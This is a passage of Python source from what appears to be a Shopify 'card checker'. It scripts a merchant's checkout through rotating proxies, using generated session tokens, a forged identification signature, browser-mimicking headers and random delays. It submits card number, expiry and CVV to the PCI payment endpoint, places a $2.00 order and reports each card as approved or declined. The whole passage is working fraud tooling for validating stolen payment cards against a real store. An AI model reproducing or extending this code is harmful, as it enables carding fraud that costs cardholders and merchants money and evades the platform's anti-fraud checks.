            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r=AQABnkM5xJCZpPtGkHegdHkf6umxo7ulKWF4CF4C23MxLwk&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        }
        
        # Need a checkout token first to construct the referer
        # Use a temporary one extracted from cookies/cart
        if not self.checkout_token:
            # Generate a fallback token
            self.checkout_token = self.generate_random_string(24)
            headers['referer'] = f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r=AQABnkM5xJCZpPtGkHegdHkf6umxo7ulKWF4CF4C23MxLwk&auto_redirect=false&edge_redirect=true&skip_shop_pay=true'
        
        payload = {
            "block_universal_redirect": True,
            "checkout_version": "c1",
            "edge_redirect": True
        }
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/shopify_pay/accelerated_checkout",
                headers=headers,
                json=payload,
                timeout=25,
                follow_redirects=True
            )
            
            self.logger.data_extracted("Accelerated Checkout", f"Status: {resp.status_code}", "Response received")
            
            # Now navigate to checkout page to get the real token
            checkout_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': f'{self.base_url}/cart',
                'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
            }
            
            resp2 = await self.client.get(
                f"{self.base_url}/cart",
                headers=checkout_headers,
                timeout=25,
                follow_redirects=True
            )
            
            current_url = str(resp2.url)
            token = self.extract_checkout_token(current_url)
            
            if token:
                self.checkout_token = token
            elif not self.checkout_token:
                return False, "COULD_NOT_EXTRACT_TOKEN"
            
            self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Cart redirect")
            
            # Construct GraphQL session token
            self.graphql_session_token = self.construct_graphql_session_token()
            self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token[:20] + "...", "Constructed")
            
            # Generate stable ID
            self.stable_id = self.generate_uuid()
            self.logger.data_extracted("Stable ID", self.stable_id, "Generated")
            
            # Extract session token
            self.session_token = f"AAEB_{self.generate_random_string(50)}_{self.generate_random_string(30)}"
            self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Generated")
            
            return True, current_url
            
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("CHECKOUT_ACCESS", str(e))
            return False, f"Error: {str(e)[:50]}"

    async def send_proposal(self, variables, step_name, step_action, step_num):
        """Generic method to send a Proposal GraphQL request"""
        self.step(step_num, step_name, step_action)
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        headers = self.get_graphql_headers()
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Failed with status {resp.status_code}"
            
            try:
                proposal_resp = resp.json()
                
                result_data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = result_data.get('queueToken')
                
                # Extract delivery strategy handle dynamically from seller proposal
                if not self.delivery_strategy_handle:
                    seller_proposal = result_data.get('sellerProposal', {})
                    delivery_terms = seller_proposal.get('delivery', {})
                    delivery_lines = delivery_terms.get('deliveryLines', [])
                    if delivery_lines:
                        strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                        if strategies:
                            handle = strategies[0].get('handle')
                            if handle:
                                self.delivery_strategy_handle = handle
                                self.logger.data_extracted("Delivery Strategy Handle", handle, "Extracted dynamically")
                
                errors = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
                error_codes = [e.get('code', '') for e in errors]
                
                if new_queue_token:
                    self.queue_token = new_queue_token
                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Updated")
                
                # Acceptable validation errors that are expected during checkout flow
                acceptable_errors = [
                    'BUYER_IDENTITY_MISSING_CONTACT_METHOD',
                    'PAYMENTS_FIRST_NAME_REQUIRED',
                    'PAYMENTS_LAST_NAME_REQUIRED', 
                    'PAYMENTS_ADDRESS1_REQUIRED',
                    'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY',
                    'PAYMENTS_POSTAL_CODE_REQUIRED',
                    'PAYMENTS_CITY_REQUIRED',
                    'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY',
                    'DELIVERY_POSTAL_CODE_REQUIRED',
                    'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                    'WAITING_PENDING_TERMS',
                    'REQUIRED_ARTIFACTS_UNAVAILABLE'
                ]
                
                non_acceptable = [code for code in error_codes if code not in acceptable_errors]
                
                if non_acceptable:
                    return False, f"DECLINED - {non_acceptable[0]}"
                
                return True, "PROPOSAL_SUCCESS"
                
            except Exception as e:
                return False, f"Parse error: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PROPOSAL_ERROR", str(e))
            return False, f"Error: {str(e)[:50]}"

    def get_base_variables(self):
        """Get base variables structure matching captured traffic exactly"""
        return {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token or f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "partialStreetAddress": {
                            "address1": "",
                            "city": "",
                            "countryCode": "US",
                            "lastName": "",
                            "phone": "",
                            "oneTimeUse": False
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 2}
                    },
                    "expectedTotalPrice": {
                        "value": {
                            "amount": "2.00",
                            "currencyCode": "USD"
                        }
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                },
                "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "includeTaxStrategyLines": False
        }

    async def proposal_1_initial_shipping(self):
        """Proposal 1: Initial with SHIPPING (matches first captured Proposal)"""
        variables = self.get_base_variables()
        return await self.send_proposal(variables, "PROPOSAL 1", "Initial SHIPPING proposal", 5)

    async def proposal_2_add_email(self):
        """Proposal 2: Add email (matches second captured Proposal)"""
        variables = self.get_base_variables()
        variables["buyerIdentity"]["email"] = self.email
        variables["buyerIdentity"]["emailChanged"] = True
        variables["buyerIdentity"]["marketingConsent"] = [{
            "email": {"consentState": "DECLINED", "value": self.email}
        }]
        return await self.send_proposal(variables, "PROPOSAL 2", f"Adding email: {self.email}", 6)

    async def proposal_3_pickup_geolocation(self):
        """Proposal 3: Switch to PICK_UP with geolocation (matches third captured Proposal)"""
        variables = self.get_base_variables()
        variables["delivery"]["deliveryLines"][0] = {
            "destination": {
                "geolocation": {
                    "coordinates": self.coordinates,
                    "countryCode": "US"
                }
            },
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True}
                },
                "options": {}
            },
            "targetMerchandiseLines": {"any": True},
            "deliveryMethodTypes": ["PICK_UP"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True
        }
        variables["buyerIdentity"]["email"] = self.email
        variables["buyerIdentity"]["emailChanged"] = True
        variables["buyerIdentity"]["marketingConsent"] = [{
            "email": {"consentState": "DECLINED", "value": self.email}
        }]
        return await self.send_proposal(variables, "PROPOSAL 3", "Pickup with geolocation", 7)

    async def proposal_4_pickup_strategy(self):
        """Proposal 4: Select pickup strategy handle (matches fourth captured Proposal)"""
        if not self.delivery_strategy_handle:
            return False, "NO_DELIVERY_HANDLE"
        
        variables = self.get_base_variables()
        variables["delivery"]["deliveryLines"][0] = {
            "destination": {
                "geolocation": {
                    "coordinates": self.coordinates,
                    "countryCode": "US"
                }
            },
            "selectedDeliveryStrategy": {
                "deliveryStrategyByHandle": {
                    "handle": self.delivery_strategy_handle,
                    "customDeliveryRate": False
                },
                "options": {}
            },
            "targetMerchandiseLines": {
                "lines": [{"stableId": self.stable_id}]
            },
            "deliveryMethodTypes": ["PICK_UP"],
            "expectedTotalPrice": {
                "value": {"amount": "0.00", "currencyCode": "USD"}
            },
            "destinationChanged": True
        }
        variables["buyerIdentity"]["email"] = self.email
        variables["buyerIdentity"]["emailChanged"] = False
        variables["buyerIdentity"]["marketingConsent"] = [{
            "email": {"consentState": "DECLINED", "value": self.email}
        }]
        variables["taxes"]["proposedTotalAmount"] = {"any": True}
        return await self.send_proposal(variables, "PROPOSAL 4", "Selecting pickup strategy", 8)

    async def proposal_5_billing_address(self, bin_prefix):
        """Proposal 5: Add billing address with BIN (matches fifth captured Proposal) - CRITICAL FIX"""
        if not self.delivery_strategy_handle:
            return False, "NO_DELIVERY_HANDLE"
        
        variables = self.get_base_variables()
        variables["delivery"]["deliveryLines"][0] = {
            "destination": {
                "geolocation": {
                    "coordinates": self.coordinates,
                    "countryCode": "US"
                }
            },
            "selectedDeliveryStrategy": {
                "deliveryStrategyByHandle": {
                    "handle": self.delivery_strategy_handle,
                    "customDeliveryRate": False
                },
                "options": {}
            },
            "targetMerchandiseLines": {
                "lines": [{"stableId": self.stable_id}]
            },
            "deliveryMethodTypes": ["PICK_UP"],
            "expectedTotalPrice": {
                "value": {"amount": "0.00", "currencyCode": "USD"}
            },
            "destinationChanged": True
        }
        # CRITICAL: creditCardBin goes in payment, not a separate field
        variables["payment"] = {
            "totalAmount": {"any": True},
            "paymentLines": [],
            "billingAddress": {
                "streetAddress": {
                    "address1": self.address["address1"],
                    "address2": self.address["address2"],
                    "city": self.address["city"],
                    "countryCode": self.address["countryCode"],
                    "postalCode": self.address["zip"],
                    "firstName": self.first_name,
                    "lastName": self.last_name,
                    "zoneCode": self.address["provinceCode"],
                    "phone": ""
                }
            },
            "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9",
            "creditCardBin": bin_prefix  # CRITICAL: BIN goes here
        }
        variables["buyerIdentity"]["email"] = self.email
        variables["buyerIdentity"]["emailChanged"] = False
        variables["buyerIdentity"]["marketingConsent"] = [{
            "email": {"consentState": "DECLINED", "value": self.email}
        }]
        return await self.send_proposal(variables, "PROPOSAL 5", f"Billing + BIN: {bin_prefix}", 9)

    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 10: Create PCI payment session"""
        self.step(10, "PCI SESSION", "Creating payment session with PCI")
        
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
        }
        
        # Generate shopify-identification-signature matching captured format
        header_b64 = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
        payload_data = {
            "client_id": "2",
            "client_account_id": self.shop_id,
            "unique_id": self.checkout_token,
            "iat": int(time.time())
        }
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
        signature = self.generate_random_string(43)
        shopify_signature = f"{header_b64}.{payload_b64}.{signature}"
        
        pci_headers['shopify-identification-signature'] = shopify_signature
        
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        month_int = int(mes)
        
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": self.full_name,
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": self.shop_domain
        }
        
        try:
            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=30) as pci_client:
                resp = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=pci_headers,
                    json=pci_payload,
                    timeout=30
                )
                
                if resp.status_code != 200:
                    return False, f"PCI failed: {resp.status_code}"
                
                pci_resp = resp.json()
                self.payment_session_id = pci_resp.get('id')
                if not self.payment_session_id:
                    return False, "No session ID"
                
                self.logger.data_extracted("PCI Session ID", self.payment_session_id[:30] + "...", "PCI")
                return True, self.payment_session_id
                    
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"PCI proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException:
            self.logger.error_log("TIMEOUT", "PCI timeout")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return False, "PCI_ERROR"

    async def submit_for_completion(self, cc):
        """Step 11: SubmitForCompletion - FINAL PAYMENT with corrected structure"""
        self.step(11, "SUBMIT PAYMENT", "Finalizing payment of 2.00$")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        headers = self.get_graphql_headers()
        
        attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
        page_id = f"{self.generate_random_string(8)}-{self.generate_random_string(4).upper()}-{self.generate_random_string(4).upper()}-{self.generate_random_string(4).upper()}-{self.generate_random_string(12).upper()}"
        
        # CORRECTED: Variables wrapped in 'input' object matching captured traffic exactly
        variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": self.graphql_session_token
                },
                "queueToken": self.queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": self.coordinates,
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.delivery_strategy_handle,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": self.stable_id}]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {"amount": "0.00", "currencyCode": "USD"}
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {
                            "items": {"value": 2}
                        },
                        "expectedTotalPrice": {
                            "value": {"amount": "2.00", "currencyCode": "USD"}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_method_identifier,
                                "sessionId": self.payment_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": self.address["address1"],
                                        "address2": self.address["address2"],
                                        "city": self.address["city"],
                                        "countryCode": self.address["countryCode"],
                                        "postalCode": self.address["zip"],
                                        "firstName": self.first_name,
                                        "lastName": self.last_name,
                                        "zoneCode": self.address["provinceCode"],
                                        "phone": ""
                                    }
                                },
                                "cardSource": None
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None
                        },
                        "amount": {
                            "value": {
                                "amount": "2",  # CORRECTED: Matches captured "2" not "2.00"
                                "currencyCode": "USD"
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["countryCode"],
                            "postalCode": self.address["zip"],
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["provinceCode"],
                            "phone": ""
                        }
                    },
                    "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9",
                    "creditCardBin": cc[:8]  # CRITICAL: BIN in payment section
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": "USD",
                        "countryCode": "US"
                    },
                    "email": self.email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [{
                        "email": {"consentState": "DECLINED", "value": self.email}
                    }],
                    "shopPayOptInPhone": {"countryCode": "US"},
                    "rememberMe": False
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": []
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": []
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r=AQABnkM5xJCZpPtGkHegdHkf6umxo7ulKWF4CF4C23MxLwk&auto_redirect=false&edge_redirect=true&skip_shop_pay=true",
                "pageId": page_id
            },
            "includeTaxStrategyLines": False
        }
        
        payload = {
            "operationName": "SubmitForCompletion",
            "variables": variables,
            "id": self.submit_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=SubmitForCompletion",
                headers=headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Submit failed: {resp.status_code}"
            
            try:
                submit_resp = resp.json()
                
                if 'errors' in submit_resp and submit_resp['errors']:
                    error_codes = [e.get('code', 'UNKNOWN') for e in submit_resp['errors']]
                    return False, f"DECLINED - {', '.join(error_codes)}"
                
                data = submit_resp.get('data', {}).get('submitForCompletion', {})
                receipt = data.get('receipt', {})
                self.receipt_id = receipt.get('id')
                
                if not self.receipt_id:
                    return False, "DECLINED - NO_RECEIPT_ID"
                
                receipt_id_short = self.receipt_id.split('/')[-1] if '/' in self.receipt_id else self.receipt_id
                self.logger.data_extracted("Receipt ID", receipt_id_short, "Submit")
                
                receipt_type = receipt.get('__typename', '')
                
                if receipt_type == 'ProcessingReceipt':
                    poll_delay = receipt.get('pollDelay', 500) / 1000
                    self.step(12, "POLL WAIT", f"Waiting {poll_delay}s", "ProcessingReceipt", "WAIT")
                    await asyncio.sleep(poll_delay)
                    return await self.poll_receipt(headers)
                    
                elif receipt_type == 'ProcessedReceipt':
                    return True, "ORDER_PLACED"
                    
                elif receipt_type == 'FailedReceipt':
                    error_info = receipt.get('processingError', {})
                    error_code = error_info.get('code', 'GENERIC_ERROR')
                    return False, f"DECLINED - {error_code}"
                    
                else:
                    return False, f"Unknown: {receipt_type}"
                    
            except Exception as e:
                return False, f"Parse error: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Submit proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException:
            self.logger.error_log("TIMEOUT", "Submit timeout")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SUBMIT_ERROR", str(e))
            return False, f"Error: {str(e)[:50]}"

    async def poll_receipt(self, headers, max_polls=5):
        """Step 12+: Poll for receipt status"""
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        poll_attempts = 0
        max_attempts = max_polls
        base_delay = 0.5
        
        while poll_attempts < max_attempts:
            poll_attempts += 1
            
            try:
                poll_payload = {
                    "operationName": "PollForReceipt",
                    "variables": {
                        "receiptId": self.receipt_id,
                        "sessionToken": self.graphql_session_token
                    },
                    "id": self.poll_id
                }
                
                resp = await self.client.post(
                    graphql_url + "?operationName=PollForReceipt",
                    headers=headers,
                    json=poll_payload,
                    timeout=25
                )
                
                if resp.status_code != 200:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay * poll_attempts)
                        continue
                    return False, "POLL_FAILED"
                
                poll_resp = resp.json()
                receipt_data = poll_resp.get('data', {}).get('receipt', {})
                
                receipt_type = receipt_data.get('__typename', '')
                
                if receipt_type == 'FailedReceipt':
                    error_info = receipt_data.get('processingError', {})
                    error_code = error_info.get('code', 'GENERIC_ERROR')
                    return False, f"DECLINED - {error_code}"
                    
                elif receipt_type == 'ProcessedReceipt':
                    self.logger.success_log("Payment processed!", f"After {poll_attempts} polls")
                    return True, "ORDER_PLACED"
                    
                elif receipt_type == 'ProcessingReceipt':
                    if poll_attempts < max_attempts:
                        poll_delay = receipt_data.get('pollDelay', 100) / 1000
                        wait_time = max(poll_delay, base_delay * poll_attempts)
                        self.step(12 + poll_attempts, f"POLL {poll_attempts}", f"Still processing", f"Wait: {wait_time:.1f}s", "WAIT")
                        await asyncio.sleep(wait_time)
                        continue
                    else:
                        return False, "DECLINED - PROCESSING_TIMEOUT"
                
                else:
                    if poll_attempts < max_attempts:
                        await asyncio.sleep(base_delay)
                        continue
                    return False, f"Unknown: {receipt_type}"
                    
            except httpx.TimeoutException:
                if poll_attempts < max_attempts:
                    await asyncio.sleep(base_delay)
                    continue
                return False, "TIMEOUT"
            except Exception as e:
                if poll_attempts < max_attempts:
                    await asyncio.sleep(base_delay)
                    continue
                return False, f"Error: {str(e)[:50]}"
        
        return False, "DECLINED - TIMEOUT"

    async def execute_checkout(self, cc, mes, ano, cvv):
        """Main checkout execution flow"""
        try:
            # Step 0: Get proxy
            self.step(0, "GET PROXY", "Getting proxy")
            
            if PROXY_SYSTEM_AVAILABLE:
                self.proxy_url = get_proxy_for_user(self.user_id, "random")
                if not self.proxy_url:
                    self.logger.error_log("NO_PROXY", "No working proxies available")
                    return False, "NO_PROXY_AVAILABLE"
                
                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30, follow_redirects=True)
                self.proxy_status = "Live ⚡️"
                self.proxy_used = True
                self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
            else:
                self.proxy_status = "No Proxy"
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
            
            # Steps 1-4: Get cookies, access pages, add to cart, get checkout token
            await self.access_homepage()
            await self.random_delay()
            
            await self.access_product_page()
            await self.random_delay()
            
            await self.add_to_cart()
            await self.random_delay()
            
            success, result = await self.accelerated_checkout()
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 5: Initial SHIPPING proposal
            success, result = await self.proposal_1_initial_shipping()
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 6: Add email
            success, result = await self.proposal_2_add_email()
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 7: Pickup geolocation
            success, result = await self.proposal_3_pickup_geolocation()
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 8: Pickup strategy handle
            success, result = await self.proposal_4_pickup_strategy()
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 9: Billing address + BIN (CRITICAL)
            bin_prefix = cc[:8]
            success, result = await self.proposal_5_billing_address(bin_prefix)
            if not success:
                return False, result
            await self.random_delay()
            
            # Step 10: PCI session
            success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
            if not success:
                return False, payment_session_id
            await self.random_delay()
            
            # Step 11: Submit for completion
            success, result = await self.submit_for_completion(cc)
            
            return success, result
            
        except Exception as e:
            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
            return False, f"Error: {str(e)[:50]}"
        finally:
            if self.client:
                await self.client.aclose()


# ========== MAIN CHECKER CLASS ==========
class ShopifyKauffmanChecker:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.logger = ShopifyLogger(user_id)
        self.proxy_status = "Dead 🚫"

    async def check_card(self, card_details, username, user_data):
        """Main card checking method"""
        start_time = time.time()

        self.logger = ShopifyLogger(self.user_id)
        self.logger.start_check(card_details)

        try:
            parsed = parse_card_input(card_details)
            if not parsed:
                elapsed_time = time.time() - start_time
                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)

            cc, mes, ano, cvv = parsed

            if not cc.isdigit() or len(cc) < 15:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data, self.proxy_status)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data, self.proxy_status)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                elapsed_time = time.time() - start_time
                return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data, self.proxy_status)

            self.logger.card_details_log(cc, mes, ano, cvv)

            checker = ShopifyKauffmanCheckout(self.user_id)
            success, result = await checker.execute_checkout(cc, mes, ano, cvv)
            
            self.proxy_status = checker.proxy_status

            elapsed_time = time.time() - start_time

            if success:
                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
            else:
                self.logger.complete_result(False, "DECLINED", result, elapsed_time)

